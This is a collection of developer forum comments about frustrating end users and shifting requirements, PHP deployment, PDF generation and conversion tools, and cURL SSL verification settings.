/u/cailoid could solve most of his problems by simply doing the work for them. Require them to fill out a ticket detailing exactly what it is they want, then create the rulesets for them. The whole goal of programming is solving problems. As long as there is a paper trail that tickets are being answered, you're doing your job. Had this problem ages ago at my first programming gig. Idiots kept interrupting my train of thought with meaningless drivel. Implemented a ticketing system and said, "If you can't describe what you want in writing, then you don't need it." Of course, I went to management first and got them to sign off on it. All of the work I had done to make the processes simple and easy that they could use if they weren't idiots, I just used as my own personal tools to automate my work. It sucks, and yes, I wasted a lot of time doing stuff they could've easily done themselves, but the ticketing system made me look like a god. 300+ tickets completed a week, most of them done automatically, and management could read the details on each of them.
LOL
I like coding because it takes my mind off of reality. Horrifying, horrifying reality.
&gt; I hope people who use .env are thinking about permissions on this file too I would hope people aren't using them in production, the whole point is getting them out of a file into the system. Permissions, as you suggested, can also protect the user here but why bother when there are already systems in place for this very use case? I don't get the point adding extra dependencies and extra complexity when the server you use already has it built in.
&gt; I'm partial to laravel, but it's not simple. Lumen is perfect then
&gt; transform laravel to plain PHP Laravel is plain PHP what are you talking about? &gt; so I can't do "PHP artisan serve" Why would you be running this no the live server? It's for development only. &gt; Also, can anyone recommend a framework that boils down to plain PHP All frameworks are "plain PHP" there's no such thing as "not plain PHP" unless you start looking at different languages that transpile to PHP.
Laravel is PHP. To clear up some confusion, running `php artisan serve` uses PHP's CLI built in server. This is not what you want to use on production (a.k.a. your remote server). PHP runs as a module on an apache or nginx server. Google "How to run PHP on Apache on Ubuntu" or "How to run PHP on nginx on Ubuntu". I'm assuming your hosting uses Ubuntu, but replace the search as needed. Usually DigitalOcean has a tutorial on it. I would bet your hosting already has PHP installed. You'll need to setup a vhost to tell Nginx/Apache *where* your PHP project is so it can associate the incoming HTTP requests with your PHP application.
Fuck users. I'm gonna replace them with a sentient AI.
There's a club for programmers that hate end-users. We meet every night after work at your local bar.
That's not second best.....that's almost certainly the best.
You don't have to write code for what you do not need, just make enough room in your code to allow it to change without a full rewrite. A simple example would be a single button program that draws a triangle. You could write a program that simply draws three lines, or you could write a program with a shape function that takes an input of the number of side and draws the shape. The result would be the same, but with the shape function, if your boss shows up and says now make it draw a square without messing up the triangle code, you can just call the shape function again, instead of creating patched together code base for triangles and squares. A more difficult example I faced was when I was tasked to output a report at the push of the button with specific columns of data in it. I coded the program so that it took in parameters of the column names and made the report. I even listed the columns to be shown along side the button which were editable. So when the boss finally said can you add this column o the report, all I did was add it to the drop down list and it was in the report. Whereas if I did not plan for the change, there would have been a lot more editing to change the code. Again when the boss wanted both reports, I simply showed him that the column names of the report were select able, he was happy again and I did not even have to code anything additional. I try to code with the mindset that the application will change in the future, so I plan accordingly. 
Chrome headless produces a file, which you can make available to your customers. I haven't looked but I would bet five pounds that the process of signing a PDF file that already exists is going to be trivial compared to setting up the the taking of the PDF.
JasperReports Server or headless Firefox?
The burnout you're experiencing is the reason why there need to be project managers and business analysts. Programmers cannot and should not be business analysts unto themselves, for the same reason that ER doctors shouldn't be doing their own triage. Providing support, talking to clients and end users, and intaking feature requests is a full-time job that detracts from an engineer's ability to do what they do best: writing the damn program. At my new job, I answer to one person about my job: my boss. I talk to two other teams besides my own: the project management team, and the application support team. The first is for new features, the second is for bugs. It's. Glorious.
I agree that a properly thought out UI can save headache later on if you know everything the application is going to do. My point was that you do not always get all the requirements in advance, you may have to rethink your UI design when new requirements are given. I have been in that situation countless number of times where I ask all the right questions, get all the details and make exactly what they need...for now, but then along come the new needs which require updates. If you plan ahead in your designs and code and take a proactive stance to change...knowing that the program will change you may be able to implement that thought in your design to either have the solution in place, or with a minor change be able to fix the program for the new need.
Good point.
I agree. Well said.
Hmm, I was thinking a product manager (to gather requirements and make product decisions, and be the one argued to about those decisions) and a pain ol' people manager (to pester upper management about hiring a pm and generally be a shit umbrella).
&gt; programmers in general are not good communicating with people. Non-technical people are not fit for managing technical people.
I thought you were doing an office space bit for a sec
Wow, this hits pretty close to home for me right now...
You mean indent - unindent? Tab, and Shift + tab Another nice one is File search : Ctrl + Shift + N. Symbol search (classes, functions etc) Ctrl + Shift + Alt + N
`CURLOPT_SSL_VERIFYHOST` and `CURLOPT_SSL_VERIFYPEER` should never be set to `false`. If an error is raised because of VERIFYHOST or VERIFYPEER it either means you do not have the certificate chain installed locally OR you are communicating with an attacker / wrong host. Setting those values to `false` exposes you to man in the middle attacks and you should consider your tokens/credentials to be compromised.
Also, realize that your coworkers, especially your managers, feel that they're contributing by offering criticism. Whether it's valid or not. They've been taught that when you're asked "What do you think?", that to give an answer like "It's nice." is career suicide because it shows lack of initiative. They HAVE to add or modify something to look involved. I know it sounds dumb, but this totally works. Intentionally leave some obvious easy issues on your first demo. Make sure it's UI based, or perhaps a simple formatting issue on output. Something that you can easily bang out in less than 2 minutes. A button that's too big. Text that's too small. A color out of scheme. A misspelled name. Not too many mistakes. Just one or two glaring and obvious ones. This is your bullshit filter. This is the net that catches all of the niggling edits that change to overall structure of your app, the edits that blow your schedule and deadlines. 
Yes this is true - however there are no credentials used in discord webhooks. anyone can send your hook messages. the token is the url and that's always visible even in https. regardless you should still verify host and peer for better security.
Used jasperreports, from tracking barcodes (shipment company: 18M pdf each year) to &gt;400pages product catalog pages (+images).I recently initiated a wrapper on https://github.com/belgattitude/soluble-jasper. Let me know if you're interested, I can fill up the missing doc (I'm the author) and release an 'api'-stable version with charting and webfonts in a couple of days. Used in prod for few years. PS: It uses a refactored version of php-java-bridge I made. The wrapper is actually not required but helps a lot (compare to http://docs.soluble.io/soluble-japha/language_recipes/#jasperreport). The javabridge is subject to caution... don't want to bring up a discussion here. But Jasper can also be used from cli (slower) or the official jasper server (less possibility to tweak). 
Depending on use cases, I also recommend use of wkhtmltopdf or headless chrome. Especially if you're about to change layout from css and html (jasper support for that is limited). For perfect looking docs, very easy to create new reports visually with jasperstudio. 
PhantomJS and print the rendered DOM.
Somebody had a case of the Mondays.
wkhtmltopdf worked best for us. Also tried dompdf but wasn't impressed with it.
Ultimately you are responsible for the way they feel about the system you provide them, that doesn't mean you are wrong and they are right, but, just like the customer asking a designer to use comic sans, it's the designer's job to solve that situation. This problem isn't about programming or coding but communication. First by deciding on deliverables, "*this is the issue, this is how we're going to solve it*", and second about communicating what happens when you wander off the optimal path to completion, since you're coding, this is a virtual certainty. If you are clear about these inevitable issues, then you can tackle them as a coding issue when they arrive, rather than perceive them as a shortcoming of what you already provided. You can rest assured that you delivered what they wanted, they simply changed your mind which requires more coding. Job security! I've been burnt by the "I know exactly what you need, don't worry about it" mentality myself, and depending on the customer and project, it still happens. Make sure you have everything in writing and accept the fact that dealing with people who do not know what they want is not only a possibility and part of the job, but also a way for you to make extra money. There is a direct relation between how enjoyable your work is and what is in your contract, after all you can charge whatever you want for the shortcomings of your customers, it's just a matter of figuring out at what price you're willing to drag your balls through broken glass. No matter how frustrating this stuff can be, just remember that you're still in a comfortable office somewhere with the AC on and not shoveling dirt with your hands at 10 cents a day.
Without knowing the specifics of your situation (do you work in a team? are you an employee or a freelancer?) let me just share how my medium sized company (100 people, 12 software developers) handles this. There's no way to completely solve the problem of technically challenged end-users and shifting requirements, but it is possible to mitigate the effects. When embarking on a new software product or feature, we make sure to get a representative from all the stakeholders together in a meeting and we hash out: * What is the MVP (Minimum Viable Product)? * What are some nice to have stretch goals? * What crazy features might you want down the road? (Just to get any ideas out on the table so we can take them into consideration) If they can't agree on a set of requirements, then we stop, have them setup their own meetings to figure that stuff out, and plan to resume our discussion at a later date (this is not uncommon). Once they know what their MVP is, we drill into the details, discussing the use-cases of how different users/situations will work, inform them of anything that is unreasonable (making Excel in PHP) and work out alternate solutions if necessary, and overall come out with a consensus. This often takes more than one meeting. After this, preliminary work can begin by the developers, and our UI Specialist starts hashing out what the app will look like. To do this he primarily uses Sketch (https://www.sketchapp.com/) and Zeplin (https://zeplin.io/). Once he has designs, they get shown to the end-users and the inevitable discussions of "oh, we need a button for this" or "I don't understand how this works" or "this isn't going to work for X reason" ensue. During this process a representative from the development team will be present for technical feedback. Based on user feedback, he will change the designs and keep giving the users walk-through demonstrations until they settle on a work-flow that everyone is happy with. While all these meetings take a bunch of time, and can be complete shit-shows on occasion, the advantage is our UI guy can make changes rapidly without incurring any significant development cost. Finally we build the app according to the designs agreed upon, not only through the MVP specification, but also as seen visually by the stakeholders through the UI mockups. And last, but not least, once the app is built, we will have training sessions where senior people familiar with the app train the other people in their department how to use it. The developers don't train people, our UI guy and Software lead train key people, and then those people have to share the knowledge with their teams. This means at least someone from each type of end-user group will have an expert who can answer questions. This "buy in" responsibility ensures people take learning the software seriously and keeps the questions that have to reach the developers to a minimum. All in all, things still aren't perfect; but they're about as good as could be hoped for given the problems you outlined in your OP.
Just wait until he asks for you to add new features to it a couple years down the road...
Yeah! The file search one I picked up pretty quick. What's auto format do?
Prince is rock solid, and the price makes sense once you factor in the time to make the free versions work. You can also use the DocRaptor service. It uses prince on the backend. 
This is why you have project managers. Gathering requirements is stupid and frustrating almost all of the time, but always less stupid and frustrating than changing already made things to the users changing requirements. 
I don't hate programming. It's the people who tell me to program whom I have a lingering distaste for.
Sir. You are a genius! 
I like your process. I just want to emphasize one point you made to others who may be reading this: Users will not, and cannot, know the full extent of what they want until they can see it. Doing so makes it concrete and much easier to talk through issues or realize missed/silly requirements. Mock-ups are great for this, since they let you do this inevitable step much more cheaply than is otherwise possible.
I just read this and got facinated by how skilled ypu are. I LOVE coding but i'm just so bad at it, and when reading something like this i just read in awe about how fucking amazing it is that one guy can create it. Props to you, and btw, there will always be retarded people that somehow got a higher rank thank you, no matter the peoffesion. If i may ask, how old are, how old were you when you started coding, whoch country do you live in and how did you learn/get into coding?
Says someone who doesn't know how to write clean code and is proud of his code plagued with 'goto'.
Recall that half the people in the world have IQs of &lt;100.
In HTTPS the url is encrypted as part of the communication, same with all the headers. This makes things like basic http authentication be secure. (ex: `https://username:password@something.com` )
not technically possible afaik. PDF is a one way road, its meant by design to be able to produce PDF files easily but very hardly to take that PDF to any other format. Every solution out there is done by reverse engineering since PDF is not an open format and adobe has not and nor will publish it ever. zamzar and small pdf wont and cant even talk about whats under the hood because its done using reverse engineering. the best you can do is make do with what you got or compromise allowing the tools you want under restrictions http://www.zamzar.com/faq.php#Q37 
As an alternative to wkhtmltopdf, which may not work depending on your needs (No JS functionality etc). You could instead also use a headless chrome and "print" to PDF.
do they have the ability to save a shortcut of the ruleset they created? Better yet, make them bookmarkable in their browser by having the ruleset in the url. I could see people getting annoyed if they had to recreate the same ruleset over and over.
Ah yes. I looked into this more. Seems that https will at least protect the url after the fqdn. The domain may be exposed for sni 
Once you have a PDF it's best to keep it PDF. PDF is the middle street between Word and an image file. PDF eliminates most of the editable aspects of the original and retains the individual lines of text, vectors and images, but in a flattened, absolutely positioned way. If you imagine you'd be able to make a perfect conversion, you can't. Especially if the documents are sensitive and so mistakes like changed formatting or lost text or meaning should be avoided at all costs, leave it as-is.
Same experience. Worse part about programming is to satisfy all the requirements and deadlines that may or may not make sense. Humans are fickle minded and imperfect. The solutions/requirements they propose will be imperfect too. I like programming too. But having been in this line for a few years, I'm not sure if I should continue being a code monkey or do something else altogether. And the problem I realized, is human. Everyone speaks their mind and from their own perspective. Every individual of different roles and position has different concerns and requirements. And all of them had to speak up to make it seem like they are contributing even if it's a conflicting idea. As long as people are not on the same page, this problem will never be solved. Either you find some ways to deals with it and just be a code monkey, start your own startup (where you get to make the final decision), or do something else that isn't digital. On a side note, my comment as well as everyone else's are a good example of speaking from one's own perspective and how communication and getting to the same page can be such a challenge. 
Are you asking end users to program? It sounds like you are.
Here you go: function p($i, callable ...$c) { foreach ($c as $cc) $i = $cc($i); return $i; }
Your attitude is terrible. Your not making software for you....you're making it for them. If the way you solve a problem isn't good enough for the end users - your software _is_ at fault. It's not the end users desire to specialize in using your software...you're being paid to create software that will enable to keep focusing on their expertise while having software ease their workload.
Yeah I did Vault a way back when too. The main thing I didn't like about it was it's redundancy. It only allows for a single fail-over. Also (at the time), wasn't really a Docker Vault solution. Otherwise, not a bad solution.
Maybe a preset system can solve some of your issues? If many requests can be solved by a ruleset in your system, allow them to be saved in a list like "My Rulesets"/"Recommended Rulesets"/"System Rulesets".
Once in a while you meet a client, or person working for a client that actually understands the processes behind their business and day to day operations. And you'll wonder why there aren't more of such persons. It happened to me that I had to deal with a large multinational company that had teams work of different countries working together. One team had two of such people, the other had two of the opposite kind. The former team are incredibly happy with the software we made them, it runs like a well oiled machine that is stressing our servers by the amount of work it's doing. The latter team... well they're still bitching about placement of checkboxes and the completely illogical contradictory features they want... and refuse to trust the software. Product designers can only get so far if ppl aren't willing to change, and don't understand their own jobs. 
There's quite some PDF to plain text converters, PDF supports a lot of stuff that word doesn't, and PDF does not require a linear setup in the way that word does (e.g. the stuff that you see at the bottom might be defined at the top of the document) If you were to give it yourself a try, you would first need to convert PDF to Postscript (which is human readable, and should be almost without loss. Think of PDF as a zipped Postscript, with some bells and whistles to add custom formats such as 3D and video), My 5 minute trial to get a homecooked version of this is to use pdftohtml (from poppler-utils debian package) pdftohtml -c -noframes input.pdf output.html This creates a html file with absolutely positioned &lt;p&gt; and other elements. This html file is reasonably clean (don't use the html2pdfEX, it seems to generate javascripted garbage), and possibly you try some homecooked html to docx conversion. Using the off the-shelf pandoc command seems to be a bit garbage, but hey, it works. pandoc -s -o test.docx test.html This is not the best docx. The header and footer are both at the top - then comes the body. My next trial would be try to order the html paragraphs and elements group the text (which is in seperate paragraphs) in the html (which looks something like this) &lt;p style="position:absolute;top:256px;left:84px;white-space:nowrap" class="ft01"&gt;HEADER&lt;/p&gt; &lt;p style="position:absolute;top:278px;left:84px;white-space:nowrap" class="ft01"&gt;HEADER&lt;/p&gt; &lt;p style="position:absolute;top:1133px;left:306px;white-space:nowrap" class="ft01"&gt;FOOTER&lt;/p&gt; &lt;p style="position:absolute;top:1155px;left:260px;white-space:nowrap" class="ft01"&gt;FOOTER&lt;/p&gt; &lt;p style="position:absolute;top:328px;left:81px;white-space:nowrap" class="ft02"&gt;BODY&lt;/p&gt; &lt;p style="position:absolute;top:370px;left:81px;white-space:nowrap" class="ft03"&gt;BODY&lt;/p&gt; I imagine I could do some javascript, that repositions the div elements by sorting them from top to bottom, which at least would give use a document in the same order. The HTML file also seems to have a finite amount of CSS styles, so that should also be possible to convert. After that, it seems you need some way to organize a similar layout in a way that word can understand (you could cook a home-made solution that would place each paragraph in its own text frame), or do something more fancy that groups things in the same text frame if they're around 60px apart (in this example). Another way would be to try SVG - this gives a bit more information (hint: paragraphs will be in the &lt;text&gt; block, and sentences generally in a &lt;tspan&gt;). inkscape \ --without-gui \ --file=input.pdf \ --export-plain-svg=output.svg I would then use something like http://svgjs.com/ to get the bounding boxes of all text elements, sort the tspans so they're in a normal order, and try to position all text elements as a textbox in a word document. I suspect this is not a very trivial task, but it's also not impossible. 
yeah, absolutely true. software is a tool and like any other tool it requires the user to embrace and become skillful with it in order for it to be useful and increase productivity. imagine if people spent all their time arguing about the grip design on a hammer and never learned how to swing it? software feels like that a lot. 
PDF has been an open format since 2008 (almost 10 years!). Here is the [PDF reference by Adobe.](http://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/pdf_reference_1-7.pdf) Heck. It's even an [ISO standard](https://www.iso.org/standard/63534.html)
I've always used wkhtmltopdf, but if I were to use it to day, I would look into a headless chrome. This package from npm looks promising. https://www.npmjs.com/package/chrome-headless-render-pdf
You should have ruleset templates that you can use to create these hardcoded rulesets. Also, tell people very long time frames for however long it will take to implement their changes. Then, when the project is behind schedule, you can start throwing these sales people under the bus since you told them how long it would take and you are still ahead of schedule. 
I'm over 30 and agree with you. I'm not single, but don't plan to have kids. Coding and constantly learning is an easier task than confronting reality. It's comforting in its own way.
Please take a look at zamzar. I don't think they made it with magic
Well, I guess I will happily charge him a new invoice for that features...
I run into this scenario a lot. People want me to code them the entire solution. I just want to code them a tool they can configure that will solve their problems. This is better than just code that solves the current problem because it anticipates future problems. I even explain this during discovery and convey that if I just build the tool and you configure it, you don't have to pay me for all the configuration. Inevitably when the tool is complete and it is handed over for them to configure they ask why the tool doesn't have all the rules already configured. I explain that we've already been over this, and that I cannot possibly know all the ins and outs of your ever-changing workflow and business rules, but all of this can be configured in the tool.
Yeah I tried it and I can confirm: there's no logic. - It lost the entire outline (i.e. I lost the distinction between title, headings, body text). - It couldn't recover the correct layout for graphics wrapped around text, it just positioned the graphic absolutely. - All wrapped lines (soft line breaks) became hard line breaks so editing column width, or count, for ex. breaks the entire document. - Ordered lists and bullet lists were converted to plain text (i.e. they're no longer lists). Oh and the bullets didn't show up. So pretty broken, exactly as I expected, and described. Such a PDF-&gt;DOC conversion is worse for printing because any number of elements may be modified, missing, or in the wrong place, and it's an outright nightmare for *editing*. Hence why it's best to keep the original PDF as-is and leave it there. Or... if you want to convert it for editing... well... you better pray you find some library **much better** than what Zamzar uses, and I'm sure it won't be written in PHP and free. 
I'm talking UX, not UI. Good user experience comes from determining what the users need and making the entire experience behave in a way which doesn't feel contrary to their expectation of their task. It's always possible to make mistakes, even after decent research, but simply designing a tool based on how I see a problem after several hours of figuring out cool abstractions is pretty much guaranteed to feel alien to someone who is doing a different job.
Can you share the pdf you have used? I converted all my pdfs successfully with zamzar so far
I deleted it. I just created a two-column page with an ordered list, bullet list, title, heading, and a circular graphic between the two columns that text is wrapping around.
The customer is great too as struggles to communicate what they want as this problem arisen now not at the beginning of the project (as now they have a program but it is not what they want). But yeah being more optimistic and trying to find something what you like in your job never hurts.
&gt; ISO 32000-2:2017 does not specify the following: &gt; - specific processes for converting paper or electronic documents to the PDF file format; which is what OP asks. 
It created a doc file (and docx) PERFECTLY! You couldn't tell any difference at all. I had tables, bold, underlines and it preserved everything. Didn't try with bullets tbh.
I just think saying yes to everything and accepting every demand is a lack in professionalism.
If you just need bolds and underlines and you have no text that wraps to more than one line, then you don't need much I guess.
Never discuss or even reply to an email from anyone other than the #1 shareholder related to a project. All that inconsistent bullshit needs to happen amongst themselves and the leader needs to give you final instructions in the form of "**I** want this because **I**..." and never Tom wants X, Jeff wants Y, Lucinda wants Z...
Use the right tool for the job: LaTeX. If you don't, you'll spend endlessly fiddling with cut-off lines in page breaks and that sort of things, and then the guy after you leave will. Just use LaTeX.
More often than not, depending on your surroundings, the people are either all competent or all morons... In my experience.
This. Right. Here. All. Day. Long. But I still enjoy cashing paychecks. 
I hate brocoli.
Ya they should see designs and know exactly how it'll behave before it's programmed. Normally we'd use a static front end to show the client some simple functionality before even thinking about starting a backed for a project like this.
I'm very much in the same boat, love programming, love learning new things, hate working for people who choose to go into the tech world for a business and have no clue what they're doing, can barely work a phone etc but then think they can tell you what is wrong or right. Obviously a lot of it is feature spec which is the problem in your story but honestly the amount of times I've had people want a feature but can't explain why it works or what the real purpose of it is yet you build it, put time into it and then when it's shit they put it back on you.
&gt; The problem is that key decisions like this aren't made by us, the programmers, but the sales team and other inept staff members. As someone who pushes back a lot - it takes a lot of fucking adjustment for organizations to understand I want what is best for them. My current one is getting accustomed to it - but it takes a bit of finesse. &gt; I ended up implementing a bunch of time-crucial hacks, and completely destroying the maintainability of the code due to a "this needs to be done yesterday" mentality from one of the "consultants". Hey we have one of those right now. It mainly comes down to communication. * Consultant requests that we modify a web form on one of our websites to perform some distinct operations after the form consumes it * Specifically, spawn some other entities on a remote system that simply consumes it via an API * Me: Oh yeah we can totally support that logic (no wtf) Result: We can't do that. I'm going to plan an improvement to [the other side] sometime in the future that will probably result in a business policy change that will take care of this anyway, since, from a business point of view, it does not make sense to begin with. If it's a higher priority we can move it up, but we're talking about several hundred hours of work to accommodate a small use case ( &lt; 5% of users ). At this time it is not in our best interest. Conversation stops there. However, for your case: &gt; I was bombarded with questions about the system by not only the president of the company, but also lower-level managers who would be using the system You, in my opinion, are not in a position to do this based on this sentence. There really needs to be complete and mutual trust in each other on a professional level. There needs to be buy-in that you're the guy who is gonna be doing whats best for them. &gt; One individual explained how it SHOULD work, and then immediately afterwards, another individual described a solution that is the exact opposite. They both literally asked me to implement a solution with two completely different outcomes, while expecting me to please them both at the same time. Oh, I was also informed that "it should work like and have all the options Excel does For these cases run the floor and whoever is having issues, talk to their boss. Then, from the boss, ask the best person who would be a resource on the intended functionality and outcomes. They are now your product owner. Congrats. Now go back and validate it with the other guys and if there is a miscommunication bring that to the product owner - they will duke it out and get you an answer. Take that, implement it. You'd be (or maybe wouldn't be) surprised by how many business requirements ive implemented that turned out to be wrong because they were right. Turns out some shit just never worked how they thought - kinda funny.
This is a great technique. Famously used by a game dev on the game Battle Chess. https://en.wikipedia.org/wiki/Battle_Chess#Development &gt; An apocryphal story of the development was the invention of "The Duck" (an example of Parkinson's law of triviality): The producers of the game were known to demand changes to the game, presumably to make their mark on the finished product. To this end, one animator added a small duck around the queen piece, but made sure that the sprite would be easily removable. Come review, the producers, predictably, okayed everything but asked for the duck to be removed. 
What's needed is a system analyst. He's someone that can effectively understand the requirements of non-technical clients and translate them into specs for technical programmers. He may or may not be the team lead, but he's definitely a decision maker.
Correct. You either look for a new job immediately or look for a new job 2 weeks after you say "no". Or look for a new job 3 months later because either you will fail at the impossible task and be seen as incompetent or the company will be foolish enough to actually fund the impossible task and eventually they will see it and you as a waste of money.
The users need a custom page in their profile where they can add 75 buttons. 1 person will need 80. Everyone else will need 7. 75% of the people would rather pay you overtime to convert their poorly worded e-mail into buttons for them. Use what you've created to make yourself some extra money. 15% of the people won't be clicking any of those buttons 6 months from now.
if libreoffice works for smaller pdfs, maybe look at spitting the larger pdfs into one pdf per page (**$ pdftk myfile.pdf burst**) , converting each page to doc/docx then merging them back together in phpword/libreoffice... I had to implement a similar system for phpexcel to improve rendering times of monthly and yearly reports.
Wkhtmltopdf can render complicated pages with 8mb of JavaScript and CSS. It doesn't support flex tho.
I recently quit to work in a company, was not doing good to my health nor mental health. I think i got stressed like 4 times or more while working for them. weeks were I wasn't able to code a hello world. Requirements are important, I got my requirements from a person which I don't know his specialty some keywords related to business, at the end it doesn't worth it, the money for that suffering. I like to code, but I prefer just have the requirement up to front to decide If I will do it. I avoid interact to much with the client as is usually a waste of time in stupid things like colours and bike parkings 
Haha, it's time honored! I'll bet there was a duck on the Statue of Liberty blueprints!
This is not even close to correct. A good PM or BA does not need to be technical to be extremely valuable. Once you’ve worked with a good PM it’s very hard to go back.
The chair analogy really hit me in the face. Nicely done. I'm such a rock star, fuck me.
Could you give an example of inputs for the language definition?
In your screenshot what does the plus button do next to each condition? Is it suppose to clone the condition or add a condition underneath it?
The key is not to accept every request blindly, but to make clear the cost (in time, resources, money, technical debt, etc). If the powers that be insist you go ahead, despite your objections, the professional thing to do is to go ahead, since they are the ones that are paying you. (Of course, if the situation is really dire, you should just smile and nod, and then hand in your resignation the next day.)
[Full Stack Radio](http://www.fullstackradio.com) As the name implies, it covers the full web development stack so you might not care about every episode but there are some good ones. Check out their past episodes also. 
If you have to choose between: a. Everyone is fucked up in exactly the same way. b. Something is wrong with me. Many people would choose (a) like you did, but more often than not, the correct answer is (b)
&gt; They've been taught that when you're asked "What do you think?", that to give an answer like "It's nice." is career suicide because it shows lack of initiative. They HAVE to add or modify something to look involved. ... Huh. I never thought of it like *that* (mostly because I'm unemployed and haven't had a job in the field yet), but I've always considered short responses like "It's nice" to be kinda rude. If I ask for comments and critique, I want something substantial! Even if it's just, "It's nice because it lets me do this and that in such a way and it's exactly what I'd hoped." And when someone asks me for comments/critique, I usually will say what I like about it, and often if I do see something negative, I'll say - usually while also saying something like, "This is a minor complaint, but I did notice that..." Even if I list 10 reasons why the thing I'm complaining about is bad, I'll say that it's still a minor complaint. Unless I feel it's a really bad thing, then obviously I'll not say it's a minor complaint.. But you get the idea, I hope.
https://github.com/GoogleChrome/puppeteer
What article did you read?
Just don't use Eloquent and it might be possible.. 
I have this problem when "regular" folk ask me for tools, they can't comprehend basic stuff like a file path. It is frustrating and I understand 100%. No way around it other than not working with them directly. When the IT department gets work at my company, the people who need the tools have about 2-3 IT managers in the way before a programmer even reads a spec sheet. Works great for me. They are the ones doing the explaining and training. I just do the programming. The thing is, for small tools I almost always work directly with the people who need it. But in your case it was no small tool. You should have had more backup. 
It adds a condition underneath. When you hover over the button there is a bootstrap tooltip that says "Add condition below".
And he'll have to write it up on the shitty software he asked for. Hahahaha!
You can install the wkhtmltopdf binaries with composer too! https://github.com/h4cc/wkhtmltopdf-amd64 I used to use Dompdf, but no support for floats and a few other missing CSS features was a bit of a pain. wkhtmltopdf works great with Laravel when you add in the Snappy wrapper.
&gt; This was met with confusion and what seemed to be an entitled sense of frustration. Another example, I showed how easy it was to filter the data by simply entering a search term in the fucking search input, which was met with a "yeah nobody is going to do that". Really? You want access to specific data but don't want to search for it? It seems they want to have hardcoded shit EVERYWHERE because typing a word is harder than clicking a button This sums up my experience with clients and end users as well. In *their* minds, they have a finite set of specific use-cases they need the software to do. You, the developer, are a salty motherfucker and have been down that road before. You know that your client hasn't fully thought through all of the use-cases. They have one or two in their head, and if you were to develop for those two use-cases, they would give you an "Oh yeah, and...." or "I forgot it also needs this...". You KNOW that's coming, so you do what you've done here: go with the flexible, maintainable, but more abstract solution. There's a middle ground: which is to treat the engine you've built as an API - an implementation detail hidden from the client. You then build one or more thin UI facade actions which correspond atomically 1:1 to the use cases enumerated by the client, which then utilize that API behind the scenes. Client has inane feature request that could be handled easily by the generic API? Just make it so that when you click the button or perform the action, it does the "heavy lifting" behind the scenes. That way if they change requirements, you just throw away that facade and create a different one that utilizes the API in a slightly different way. But I get it. That's besides the point. The reality is that clients suck and people are stupid, and it makes software development really frustrating sometimes. Just remember that logical thinking is an inevitable result of programming, so the way a software developer thinks will invariably end up diverging from the way the general population thinks. This is where that communication and expectation impedance comes from. &gt; Sometimes I consider starting my own home renovation company Be warned: same shit, different profession. Client wants X and Y. X is incompatible with Y. Some scenarios to think about: * Imagine a staircase leading into a finished basement. Current staircase is too steep for the client's taste (still to code, but they don't like it). They tell you they want it to be less steep. This means adding one or more risers. Except doing so also means adding one or more runs. They also tell you they want a landing at the bottom to be at least 4 feet from the basement wall so they can put a bookcase or table against the wall. Well if you add risers, you have to add runs, and if you add runs, you eat into the space available at the bottom where the landing is. They can't have both 4 feet of landing space, AND more steps. It just can't work. You think the client can visualize that though? Probably not. * "*Yeah I just had a baby, so when you're doing construction in the next room over, if you could keep it quiet, that'd be great*" * "*I want to add a dormer on the roof*". "I'll have to make the roof taller to accomodate it". "*I don't want the roof to be taller.*" * "*I want to go open concept*" ...gets quote... "*What do you mean it's going to cost double the budget to put a 26 foot steel beam across the house!?*"
I don't care. Downvoted :)
Basically [this](https://dab1nmslvvntp.cloudfront.net/wp-content/uploads/2014/02/demo01.gif)
I'm 30. Started when I was 15. I got into coding by viewing the source code of websites I created with Microsoft Word.
Gathering requirements is key, but it also means giving someone the responsibility and final word in deciding what requests get to be requirements, which requests are already reasonably covered etc. with respect to the cost of adding and changing requirements and implementing them. I can gather requirements all day and it will amount to nothing if people don't respect the compromises that had to be made in that process. Sounds like in OPs case that this isn't up to the team itself or some designated product owner, but "every Tom, Dick and Harry in the company". Sounds like the team is basically working on the project without any budget constraints if implementing excel in the browser somehow has to be considered as a reasonable request. It's hard to maintain professional pride and creative initiative working under such circumstances. You're expected to creatively come up with smart solutions while simultaneously there is a culture of letting everyone have their say in how and even their own personal idea of what needs to be solved, and having those people interact directly with the developers. It's cool if you can say that since no one else has, we as developers will take full ownership of this product with all the associated responsibilities and executive power, and this is the process we use to deal with feature requests and requirements, but unfortunately not every workplace has a culture where this type of initiative would be welcome. In every place I've worked at the ideas of developers as a ticket solving machines and as creative directors of their projects have some times come at weird odds with each other. My creative decisions that have been specced out and even previously agreed on by all involved parties suddenly overridden by my manager or his manager. People from different parts of the organization calling me and telling me what needed to be delivered yesterday and the manager not really knowing how to cope with it. People are people and we should respect that with some level of agility in the development process, but there needs to be a well thought out process in the first place for that to be possible. So I got the guts to say sure, we'll do that but the initial scope was a week of work and we'll have to agree on adding another month to the budget and possibly sell this at a loss, or nope, we won't do that but we can do this which fits nicely into the model which we already have. I was happy I could say those things, not everyone is in a position where they can do this without risking getting replaced by someone that'll quietly accept having to work 12 hour days brutally hacking those things into the product in a way that'll move half the cost to the next change request when you have to read and understand the mess. &gt; Your value isn't in the code you write, it's in the problems you solve I very much believe this, but I have not worked in a place where only developers have a say in how to solve the problems. You're sometimes handed ideas for new features, all with the best intent, but often not describing problems but solutions that sometimes conflict with the solutions that already exist for the problem. Everyone naturally wants a say because they're invested in the product and are excited about it. The best you can hope for in a workplace where a process is in place to make sure that these things happen infrequently.
Have a look at some of the .y files here: https://github.com/ircmaxell/PHP-Yacc/tree/master/examples
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [ircmaxell/PHP-Yacc/.../**examples** (master → 2e7cf49)](https://github.com/ircmaxell/PHP-Yacc/tree/2e7cf497fb8a033d7b9e5c1425d04825439ae18e/examples) ---- ^(Shoot me a PM if you think I'm doing something wrong.)
Every word true.
GitLab built-in CI
Great advice. Programming has an odd caveat where 99% of the time the customer is wrong. Deadset wrong. You need people around you to make your customers understand this.
John Snow?
&gt; A company full of people who couldn’t comprehend what an address bar was hired someone to add bookmarks to the administration system to everyone’s IE bookmarks bar. Sheer insanity.
Pretty much sums it up. Management Culture... People with no idea of what they are doing, earning tons of money by destroying the corporation that trusted them... Welcome to the 21st Century. Where Skill doesn't matter, if the other person earns more than you and can just order you to do it the wrong way... 
Even though possible, pdf is explicitly designed not to be editable. Trying to convert it back into a format that can be edited is working actively against the purpose of pdf. You might be able to do it, but you'll have to hack it and the results won't be clean. Usually when people give out pdfs, they give you a pdf for a reason. If they wanted you to be able to edit it, they'd send a different format. 
AppVeyor if you need to test on windows.
